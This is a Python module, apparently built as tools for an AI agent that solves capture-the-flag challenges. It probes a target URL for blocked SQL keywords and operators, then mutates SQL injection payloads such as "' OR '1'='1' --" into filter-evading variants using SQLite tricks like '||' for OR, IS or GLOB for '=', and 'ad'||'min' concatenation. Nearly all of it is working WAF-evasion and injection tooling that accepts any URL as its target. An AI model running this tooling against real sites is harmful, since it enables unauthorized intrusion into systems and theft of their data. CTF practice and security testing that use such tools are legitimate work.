"""
Filter bypass and WAF evasion tools for CTF solving.

Provides systematic filter enumeration and payload mutation for bypassing
web application firewalls and input filters, with special focus on SQLite
bypass techniques learned from real CTF challenge failures.
"""

import json
import re
from typing import Dict, List, Optional, Tuple

import requests


class FilterEnumeratorTool:
    """
    FilterEnumeratorTool: Systematically test which keywords/characters are blocked
    by a WAF or input filter.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/login",
          "param": "username",
          "method": "POST",
          "data": {"user": "", "pass": ""},
          "filter_type": "sql",
          "headers": {},
          "timeout": 10
        }

    Required: url, param.
    Optional: method (POST), data ({}), headers ({}), timeout (10), filter_type (sql).
    """

    name: str = "filter_enumerator"
    description: str = (
        "Systematically test which keywords and characters are blocked by a WAF or "
        "input filter. Input must be JSON with keys: 'url' (target URL), 'param' "
        "(parameter name to test filters on), optional 'method' ('GET' or 'POST', "
        "default 'POST'), optional 'data' (other form data to include), optional "
        "'filter_type' ('sql', default 'sql'), optional 'headers', optional 'timeout' "
        "(default 10). Returns a structured report listing which keywords and operators "
        "are blocked vs allowed, enabling targeted payload construction."
    )

    # SQL keywords to test
    SQL_KEYWORDS: List[str] = [
        "OR", "AND", "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP",
        "WHERE", "FROM", "LIKE", "GLOB", "IS", "NOT", "NULL", "BETWEEN",
        "true", "false", "admin",
    ]

    # SQL operators/characters to test
    SQL_OPERATORS: List[str] = [
        "=", "!=", "<>", "<", ">", "<=", ">=",
        ";", "--", "/*", "*/", "#",
        "||", "'", '"',
    ]

    # Words in response body that indicate a filter/WAF block
    BLOCK_INDICATORS: List[str] = [
        "blocked", "filtered", "forbidden", "waf",
        "not allowed", "rejected", "invalid input",
        "illegal", "banned", "denied",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _get_test_items(self, filter_type: str) -> Tuple[List[str], List[str]]:
        """Return (keywords, operators) lists for the given filter type."""
        if filter_type == "sql":
            return self.SQL_KEYWORDS, self.SQL_OPERATORS
        # Default to SQL; extend here for future filter types (xss, etc.)
        return self.SQL_KEYWORDS, self.SQL_OPERATORS

    def _is_blocked(
        self,
        resp: requests.Response,
        baseline_status: int,
        baseline_length: int,
    ) -> Tuple[bool, List[str]]:
        """
        Determine whether a response indicates the input was blocked.

        Returns (is_blocked, reasons).
        """
        reasons: List[str] = []

        # 1. Status code differs from baseline (e.g., 403 vs 200)
        if resp.status_code != baseline_status:
            reasons.append(f"status_code changed: {baseline_status} -> {resp.status_code}")

        # 2. Check for block indicator words in response body
        body_lower = resp.text.lower()
        for indicator in self.BLOCK_INDICATORS:
            if indicator in body_lower:
                reasons.append(f"body contains '{indicator}'")
                break  # One indicator is enough

        # 3. Significant length change (>50% shorter or longer)
        resp_length = len(resp.text)
        if baseline_length > 0:
            ratio = resp_length / baseline_length
            if ratio < 0.5:
                reasons.append(
                    f"response {int((1 - ratio) * 100)}% shorter "
                    f"({resp_length} vs {baseline_length} bytes)"
                )
            elif ratio > 1.5:
                reasons.append(
                    f"response {int((ratio - 1) * 100)}% longer "
                    f"({resp_length} vs {baseline_length} bytes)"
                )

        return len(reasons) > 0, reasons

    def _send_request(
        self,
        url: str,
        method: str,
        param: str,
        value: str,
        form_data: Dict,
        headers: Dict,
        timeout: int,
    ) -> Optional[requests.Response]:
        """Send a single request with the test value injected into param."""
        test_data = {**form_data, param: value}
        try:
            if method == "GET":
                return self.session.get(
                    url, params=test_data, headers=headers, timeout=timeout
                )
            else:
                return self.session.post(
                    url, data=test_data, headers=headers, timeout=timeout
                )
        except Exception:
            return None

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[FilterEnumeratorTool] Error: Invalid JSON input. {exc}"

        # Validate required fields
        url = data.get("url")
        if not url or not isinstance(url, str):
            return "[FilterEnumeratorTool] Error: 'url' (string) is required."

        param = data.get("param")
        if not param or not isinstance(param, str):
            return "[FilterEnumeratorTool] Error: 'param' (string) is required."

        method = (data.get("method") or "POST").upper()
        if method not in ("GET", "POST"):
            return "[FilterEnumeratorTool] Error: 'method' must be 'GET' or 'POST'."

        form_data = data.get("data") or {}
        headers = data.get("headers") or {}
        timeout = data.get("timeout", 10)
        filter_type = data.get("filter_type", "sql").lower()

        keywords, operators = self._get_test_items(filter_type)

        # Step 1: Get baseline response with clean/innocuous input
        baseline_resp = self._send_request(
            url, method, param, "cleaninput123", form_data, headers, timeout
        )
        if baseline_resp is None:
            return (
                "[FilterEnumeratorTool] Error: Could not get baseline response. "
                "Check that the URL is reachable."
            )

        baseline_status = baseline_resp.status_code
        baseline_length = len(baseline_resp.text)

        blocked_keywords: List[Tuple[str, List[str]]] = []
        allowed_keywords: List[str] = []
        blocked_operators: List[Tuple[str, List[str]]] = []
        allowed_operators: List[str] = []
        error_items: List[Tuple[str, str]] = []

        # Step 2: Test each keyword individually
        for keyword in keywords:
            resp = self._send_request(
                url, method, param, keyword, form_data, headers, timeout
            )
            if resp is None:
                error_items.append((keyword, "request failed"))
                continue

            is_blocked, reasons = self._is_blocked(resp, baseline_status, baseline_length)
            if is_blocked:
                blocked_keywords.append((keyword, reasons))
            else:
                allowed_keywords.append(keyword)

        # Step 3: Test each operator individually
        for operator in operators:
            resp = self._send_request(
                url, method, param, operator, form_data, headers, timeout
            )
            if resp is None:
                error_items.append((operator, "request failed"))
                continue

            is_blocked, reasons = self._is_blocked(resp, baseline_status, baseline_length)
            if is_blocked:
                blocked_operators.append((operator, reasons))
            else:
                allowed_operators.append(operator)

        # Build structured report
        total_tested = len(keywords) + len(operators)
        total_blocked = len(blocked_keywords) + len(blocked_operators)
        total_allowed = len(allowed_keywords) + len(allowed_operators)

        output_lines = [
            "[FilterEnumeratorTool] Filter Enumeration Report",
            "=" * 55,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Filter Type: {filter_type}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
            f"Total Tested: {total_tested}",
            f"Blocked: {total_blocked}",
            f"Allowed: {total_allowed}",
            f"Errors: {len(error_items)}",
            "",
        ]

        # Blocked keywords section
        output_lines.append(f"BLOCKED KEYWORDS ({len(blocked_keywords)}):")
        output_lines.append("-" * 40)
        if blocked_keywords:
            for kw, reasons in blocked_keywords:
                output_lines.append(f"  [BLOCKED] {kw}")
                for reason in reasons:
                    output_lines.append(f"            -> {reason}")
        else:
            output_lines.append("  (none)")
        output_lines.append("")

        # Allowed keywords section
        output_lines.append(f"ALLOWED KEYWORDS ({len(allowed_keywords)}):")
        output_lines.append("-" * 40)
        if allowed_keywords:
            output_lines.append(f"  {', '.join(allowed_keywords)}")
        else:
            output_lines.append("  (none)")
        output_lines.append("")

        # Blocked operators section
        output_lines.append(f"BLOCKED OPERATORS ({len(blocked_operators)}):")
        output_lines.append("-" * 40)
        if blocked_operators:
            for op, reasons in blocked_operators:
                output_lines.append(f"  [BLOCKED] {repr(op)}")
                for reason in reasons:
                    output_lines.append(f"            -> {reason}")
        else:
            output_lines.append("  (none)")
        output_lines.append("")

        # Allowed operators section
        output_lines.append(f"ALLOWED OPERATORS ({len(allowed_operators)}):")
        output_lines.append("-" * 40)
        if allowed_operators:
            output_lines.append(f"  {', '.join(repr(op) for op in allowed_operators)}")
        else:
            output_lines.append("  (none)")
        output_lines.append("")

        # Errors section
        if error_items:
            output_lines.append(f"ERRORS ({len(error_items)}):")
            output_lines.append("-" * 40)
            for item, err in error_items:
                output_lines.append(f"  {repr(item)}: {err}")
            output_lines.append("")

        # Recommendations
        output_lines.append("RECOMMENDATIONS:")
        output_lines.append("-" * 40)

        blocked_kw_set = {kw.lower() for kw, _ in blocked_keywords}
        blocked_op_set = {op for op, _ in blocked_operators}

        if "or" in blocked_kw_set and "||" not in blocked_op_set:
            output_lines.append("  - 'OR' blocked but '||' allowed: use '||' for boolean OR")
        if "and" in blocked_kw_set:
            output_lines.append("  - 'AND' blocked: use nested subqueries or CASE WHEN expressions")
        if "=" in blocked_op_set:
            if "IS" in [kw for kw in allowed_keywords]:
                output_lines.append("  - '=' blocked but IS allowed: use 'IS' for equality")
            if "GLOB" in [kw for kw in allowed_keywords]:
                output_lines.append("  - '=' blocked but GLOB allowed: use 'GLOB' for matching")
            if "LIKE" in [kw for kw in allowed_keywords]:
                output_lines.append("  - '=' blocked but LIKE allowed: use 'LIKE' for matching")
            if "BETWEEN" in [kw for kw in allowed_keywords]:
                output_lines.append("  - '=' blocked but BETWEEN allowed: use 'BETWEEN x AND x'")
        if "--" in blocked_op_set and "/*" not in blocked_op_set:
            output_lines.append("  - '--' blocked but '/*' allowed: use '/**/' for comments")
        if "--" in blocked_op_set and "/*" in blocked_op_set:
            output_lines.append("  - All comments blocked: try no-comment query termination")
        if "admin" in blocked_kw_set and "||" not in blocked_op_set:
            output_lines.append("  - 'admin' blocked but '||' allowed: use 'ad'||'min' concatenation")
        if "like" in blocked_kw_set and "GLOB" in [kw for kw in allowed_keywords]:
            output_lines.append("  - 'LIKE' blocked but GLOB allowed: use GLOB for pattern matching")
        if "true" in blocked_kw_set:
            output_lines.append("  - 'true' blocked: use literal 1 instead")
        if "false" in blocked_kw_set:
            output_lines.append("  - 'false' blocked: use literal 0 instead")
        if "union" in blocked_kw_set:
            output_lines.append("  - 'UNION' blocked: try case variation (UnIoN) or encoding")
        if "select" in blocked_kw_set:
            output_lines.append("  - 'SELECT' blocked: try case variation (SeLeCt) or encoding")

        if not blocked_keywords and not blocked_operators:
            output_lines.append("  No filters detected! Standard payloads should work.")

        return "\n".join(output_lines)


class PayloadMutatorTool:
    """
    PayloadMutatorTool: Generate bypass variants of a payload by replacing blocked
    keywords and operators with equivalent alternatives.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Focused on SQLite bypass strategies derived from real CTF challenge failures
    (PicoCTF Web Gauntlet 2, etc.).

    Expected JSON tool_input format:

        {
          "payload": "' OR '1'='1' --",
          "blocked_keywords": ["or", "=", "--"],
          "max_length": 35,
          "db_type": "sqlite"
        }

    Required: payload.
    Optional: blocked_keywords (default []), max_length (0 = unlimited), db_type (sqlite).
    """

    name: str = "payload_mutator"
    description: str = (
        "Generate bypass variants of a SQL injection payload by replacing blocked "
        "keywords and operators with equivalent alternatives. Specializes in SQLite "
        "bypass strategies. Input must be JSON with keys: 'payload' (the original "
        "payload string), optional 'blocked_keywords' (list of blocked strings, "
        "default []), optional 'max_length' (max payload length, 0 = unlimited), "
        "optional 'db_type' ('sqlite', 'mysql', 'postgresql', default 'sqlite'). "
        "Returns all valid bypass variants with explanations of substitutions applied."
    )

    # Bypass strategies: blocked_token -> list of (replacement, description)
    # Case-insensitive matching is used for keyword lookups.
    SQLITE_BYPASSES: Dict[str, List[Tuple[str, str]]] = {
        # Equality operators
        "=": [
            ("IS", "IS operator (SQLite equality)"),
            ("GLOB", "GLOB operator (case-sensitive match)"),
            ("LIKE", "LIKE operator (pattern match)"),
        ],
        "!=": [
            ("IS NOT", "IS NOT operator (SQLite inequality)"),
        ],
        "<>": [
            ("IS NOT", "IS NOT operator (SQLite inequality)"),
        ],
        # Boolean logic
        "or": [
            ("||", "double-pipe boolean OR"),
        ],
        "and": [
            ("", "remove AND (use nested subquery instead)"),
        ],
        # Keywords with value substitution
        "true": [
            ("1", "literal 1"),
        ],
        "false": [
            ("0", "literal 0"),
        ],
        # Admin keyword bypass via concatenation
        "admin": [
            ("ad'||'min", "concatenation bypass (ad'||'min)"),
            ("adm'||'in", "concatenation bypass (adm'||'in)"),
            ("a'||'dmin", "concatenation bypass (a'||'dmin)"),
            ("admi'||'n", "concatenation bypass (admi'||'n)"),
            ("AD'||'MIN", "upper concatenation bypass"),
        ],
        # Comment-based bypasses
        "--": [
            ("/**/", "block comment"),
            ("#", "hash comment"),
            ("", "no-comment termination (remove entirely)"),
        ],
        "/*": [
            ("#", "hash comment instead of block comment"),
            ("", "remove comment entirely"),
        ],
        "*/": [
            ("", "remove closing block comment"),
        ],
        # Case variation bypasses for keywords
        "union": [
            ("UnIoN", "mixed case bypass"),
            ("UNION", "upper case"),
            ("uNiOn", "alternating case bypass"),
        ],
        "select": [
            ("SeLeCt", "mixed case bypass"),
            ("SELECT", "upper case"),
            ("sElEcT", "alternating case bypass"),
        ],
        "insert": [
            ("InSeRt", "mixed case bypass"),
        ],
        "update": [
            ("UpDaTe", "mixed case bypass"),
        ],
        "delete": [
            ("DeLeTe", "mixed case bypass"),
        ],
        "drop": [
            ("DrOp", "mixed case bypass"),
        ],
        "where": [
            ("WhErE", "mixed case bypass"),
        ],
        "from": [
            ("FrOm", "mixed case bypass"),
        ],
        # Pattern matching
        "like": [
            ("GLOB", "GLOB operator (case-sensitive alternative)"),
        ],
        # Semicolon
        ";": [
            ("", "remove semicolon"),
        ],
    }

    # Additional BETWEEN bypass for equality: '=' on value comparison
    # This is handled specially in _generate_equality_bypasses

    def _find_blocked_in_payload(
        self, payload: str, blocked_keywords: List[str]
    ) -> List[Tuple[str, int, int]]:
        """
        Find all occurrences of blocked keywords in the payload.
        Returns list of (matched_text, start_index, end_index).
        Case-insensitive for word keywords, exact for operators.
        """
        occurrences: List[Tuple[str, int, int]] = []
        payload_lower = payload.lower()

        for blocked in blocked_keywords:
            blocked_lower = blocked.lower()
            search_in = payload_lower
            start = 0

            while True:
                idx = search_in.find(blocked_lower, start)
                if idx == -1:
                    break
                # Record the original text from payload at this position
                matched = payload[idx : idx + len(blocked)]
                occurrences.append((matched, idx, idx + len(blocked)))
                start = idx + 1

        # Sort by position
        occurrences.sort(key=lambda x: x[1])
        return occurrences

    def _get_bypasses_for(
        self, blocked_token: str, db_type: str
    ) -> List[Tuple[str, str]]:
        """
        Get available bypass replacements for a blocked token.
        Returns list of (replacement, description).
        """
        token_lower = blocked_token.lower()

        # Look up in the bypass table
        bypasses = self.SQLITE_BYPASSES.get(token_lower, [])

        # For '=' with a value context, add BETWEEN bypass
        if token_lower == "=":
            bypasses = list(bypasses)  # copy to avoid mutating class state
            # BETWEEN is added dynamically when we process the full payload

        return bypasses

    def _generate_variants(
        self, payload: str, blocked_keywords: List[str], db_type: str
    ) -> List[Tuple[str, List[str]]]:
        """
        Generate all bypass variants of the payload.
        Returns list of (variant_payload, list_of_substitutions_applied).
        """
        variants: List[Tuple[str, List[str]]] = []

        # Strategy 1: Single-token replacement
        # For each blocked keyword found in the payload, replace it with each bypass
        for blocked in blocked_keywords:
            blocked_lower = blocked.lower()
            bypasses = self._get_bypasses_for(blocked, db_type)

            if not bypasses:
                continue

            # Find all case-insensitive occurrences
            pattern = re.compile(re.escape(blocked), re.IGNORECASE)
            matches = list(pattern.finditer(payload))

            if not matches:
                continue

            for replacement, desc in bypasses:
                # Replace all occurrences of this blocked keyword
                new_payload = pattern.sub(replacement, payload)
                if new_payload != payload:
                    variants.append((new_payload, [f"{blocked} -> {replacement} ({desc})"]))

        # Strategy 2: Handle '=' with BETWEEN bypass (context-aware)
        # Pattern: 'X'='Y' -> 'X' BETWEEN 'Y' AND 'Y'
        if "=" in [b.lower() for b in blocked_keywords]:
            between_pattern = re.compile(
                r"(['\"]?)([^'\"=<>!]+)\1\s*=\s*(['\"]?)([^'\"=<>!]+)\3"
            )
            for match in between_pattern.finditer(payload):
                q1, val1, q2, val2 = match.group(1), match.group(2), match.group(3), match.group(4)
                original = match.group(0)
                between_expr = f"{q1}{val1}{q1} BETWEEN {q2}{val2}{q2} AND {q2}{val2}{q2}"
                new_payload = payload.replace(original, between_expr, 1)
                if new_payload != payload:
                    variants.append((
                        new_payload,
                        [f"{original} -> {between_expr} (BETWEEN equality bypass)"],
                    ))

        # Strategy 3: Multi-token replacement (replace ALL blocked tokens at once)
        # This is the most useful for heavily filtered environments
        multi_payload = payload
        multi_subs: List[str] = []

        for blocked in blocked_keywords:
            blocked_lower = blocked.lower()
            bypasses = self._get_bypasses_for(blocked, db_type)

            if not bypasses:
                continue

            pattern = re.compile(re.escape(blocked), re.IGNORECASE)
            if pattern.search(multi_payload):
                # Use the first available bypass
                replacement, desc = bypasses[0]
                multi_payload = pattern.sub(replacement, multi_payload)
                multi_subs.append(f"{blocked} -> {replacement} ({desc})")

        if multi_subs and multi_payload != payload:
            variants.append((multi_payload, multi_subs))

        # Strategy 4: For 'and' keyword, offer CASE WHEN alternatives
        if "and" in [b.lower() for b in blocked_keywords]:
            and_pattern = re.compile(r"\bAND\b", re.IGNORECASE)
            if and_pattern.search(payload):
                # Replace AND with CASE WHEN nested approach
                new_payload = and_pattern.sub(
                    "AND", payload  # Keep AND but wrap in CASE
                )
                # Actually show the CASE WHEN pattern as guidance
                case_variant = and_pattern.sub("", payload).strip()
                if case_variant != payload:
                    variants.append((
                        case_variant,
                        ["AND -> removed (use CASE WHEN ... THEN ... END for boolean logic)"],
                    ))

        # Deduplicate variants (same payload text)
        seen: Dict[str, int] = {}
        unique_variants: List[Tuple[str, List[str]]] = []
        for v_payload, v_subs in variants:
            if v_payload not in seen:
                seen[v_payload] = len(unique_variants)
                unique_variants.append((v_payload, v_subs))
            else:
                # Merge substitution descriptions
                idx = seen[v_payload]
                existing_subs = unique_variants[idx][1]
                for s in v_subs:
                    if s not in existing_subs:
                        existing_subs.append(s)

        return unique_variants

    def _check_still_blocked(
        self, variant: str, blocked_keywords: List[str]
    ) -> List[str]:
        """
        Check if a variant still contains any blocked keywords.
        Returns list of blocked keywords still present.
        """
        still_blocked: List[str] = []
        variant_lower = variant.lower()
        for blocked in blocked_keywords:
            if blocked.lower() in variant_lower:
                still_blocked.append(blocked)
        return still_blocked

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[PayloadMutatorTool] Error: Invalid JSON input. {exc}"

        # Validate required fields
        payload = data.get("payload")
        if not payload or not isinstance(payload, str):
            return "[PayloadMutatorTool] Error: 'payload' (string) is required."

        blocked_keywords = data.get("blocked_keywords", [])
        if not isinstance(blocked_keywords, list):
            return "[PayloadMutatorTool] Error: 'blocked_keywords' must be a list of strings."

        max_length = data.get("max_length", 0)
        db_type = data.get("db_type", "sqlite").lower()

        # Generate all variants
        variants = self._generate_variants(payload, blocked_keywords, db_type)

        # Filter by max_length if specified
        if max_length and max_length > 0:
            variants = [
                (v, subs)
                for v, subs in variants
                if len(v) <= max_length
            ]

        # Check each variant for remaining blocked keywords
        variant_results: List[Tuple[str, List[str], List[str], bool]] = []
        for v_payload, v_subs in variants:
            still_blocked = self._check_still_blocked(v_payload, blocked_keywords)
            is_clean = len(still_blocked) == 0
            variant_results.append((v_payload, v_subs, still_blocked, is_clean))

        # Sort: clean variants first, then by length (shorter = better)
        variant_results.sort(key=lambda x: (not x[3], len(x[0])))

        # Build output
        clean_count = sum(1 for _, _, _, is_clean in variant_results if is_clean)
        partial_count = len(variant_results) - clean_count

        output_lines = [
            "[PayloadMutatorTool] Payload Mutation Report",
            "=" * 55,
            f"Original Payload: {payload}",
            f"Original Length: {len(payload)} chars",
            f"Blocked Keywords: {', '.join(blocked_keywords) if blocked_keywords else '(none)'}",
            f"Max Length: {max_length if max_length > 0 else 'unlimited'}",
            f"Database Type: {db_type}",
            "",
            f"Total Variants Generated: {len(variant_results)}",
            f"Clean (all blocked removed): {clean_count}",
            f"Partial (some blocked remain): {partial_count}",
            "",
        ]

        if not variant_results:
            output_lines.append("No variants could be generated.")
            output_lines.append("")
            output_lines.append("SUGGESTIONS:")
            output_lines.append("  - Try a completely different payload structure")
            output_lines.append("  - Consider encoding-based bypasses (URL encode, double encode)")
            output_lines.append("  - Check if the filter is case-sensitive")
            if max_length and max_length > 0:
                output_lines.append(
                    f"  - Max length ({max_length}) may be too restrictive; "
                    f"try increasing or removing it"
                )
            return "\n".join(output_lines)

        # Clean variants section
        if clean_count > 0:
            output_lines.append(f"CLEAN VARIANTS ({clean_count}) - No blocked keywords remain:")
            output_lines.append("-" * 50)
            variant_num = 0
            for v_payload, v_subs, still_blocked, is_clean in variant_results:
                if not is_clean:
                    continue
                variant_num += 1
                output_lines.append(f"  Variant #{variant_num}:")
                output_lines.append(f"    Payload: {v_payload}")
                output_lines.append(f"    Length:  {len(v_payload)} chars")
                output_lines.append(f"    Changes:")
                for sub in v_subs:
                    output_lines.append(f"      - {sub}")
                output_lines.append("")
        else:
            output_lines.append("NO CLEAN VARIANTS - all variants still contain blocked keywords.")
            output_lines.append("")

        # Partial variants section
        if partial_count > 0:
            output_lines.append(f"PARTIAL VARIANTS ({partial_count}) - Some blocked keywords remain:")
            output_lines.append("-" * 50)
            variant_num = 0
            for v_payload, v_subs, still_blocked, is_clean in variant_results:
                if is_clean:
                    continue
                variant_num += 1
                output_lines.append(f"  Variant #{variant_num}:")
                output_lines.append(f"    Payload: {v_payload}")
                output_lines.append(f"    Length:  {len(v_payload)} chars")
                output_lines.append(f"    Changes:")
                for sub in v_subs:
                    output_lines.append(f"      - {sub}")
                output_lines.append(f"    Still blocked: {', '.join(still_blocked)}")
                output_lines.append("")

        # Bypass reference table
        output_lines.append("BYPASS REFERENCE (all available strategies):")
        output_lines.append("-" * 50)
        for blocked in blocked_keywords:
            bypasses = self._get_bypasses_for(blocked, db_type)
            if bypasses:
                replacements_str = ", ".join(
                    f"{repl!r} ({desc})" for repl, desc in bypasses
                )
                output_lines.append(f"  {blocked!r} -> {replacements_str}")
            else:
                output_lines.append(f"  {blocked!r} -> (no known bypasses)")

        return "\n".join(output_lines)
